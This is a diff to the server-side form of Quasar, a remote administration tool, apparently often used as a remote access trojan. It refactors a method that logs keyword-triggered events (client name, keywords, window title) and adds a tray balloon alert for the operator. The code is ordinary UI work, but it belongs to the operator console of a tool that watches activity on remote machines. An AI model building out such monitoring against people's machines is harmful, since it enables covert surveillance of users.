@@ -1207,22 +1207,22 @@ namespace Quasar.Server.Forms
 
         //Add Event to Notification Centre
 
-        public static void AddNotiEvent(FrmMain frmMain, string Client, string Keywords, string WindowText)
+        public static void AddNotiEvent(FrmMain frmMain, string client, string keywords, string windowText)
         {
             if (frmMain.lstNoti.InvokeRequired)
             {
-                frmMain.lstNoti.Invoke(new Action(() => AddNotiEvent(frmMain, Client, Keywords, WindowText)));
+                frmMain.lstNoti.Invoke(new Action(() => AddNotiEvent(frmMain, client, keywords, windowText)));
                 return;
             }
-            ListViewItem item = new ListViewItem(Client);
+            ListViewItem item = new ListViewItem(client);
             item.SubItems.Add(DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"));
-            item.SubItems.Add(Keywords);
-            while (item.SubItems.Count < 11)
-            {
-                item.SubItems.Add("");
-            }
-            item.SubItems[3].Text = WindowText;
+            item.SubItems.Add(keywords);
+            item.SubItems.Add(windowText);
             frmMain.lstNoti.Items.Add(item);
+
+            frmMain.notifyIcon.Visible = true;
+            frmMain.notifyIcon.ShowBalloonTip(4000, $"Keyword Triggered: {keywords}", $"Client: {client}\nWindow: {windowText}", ToolTipIcon.Info);
+            frmMain.notifyIcon.Visible = false;
         }
 
         private void clientsToolStripMenuItem_Click(object sender, EventArgs e)
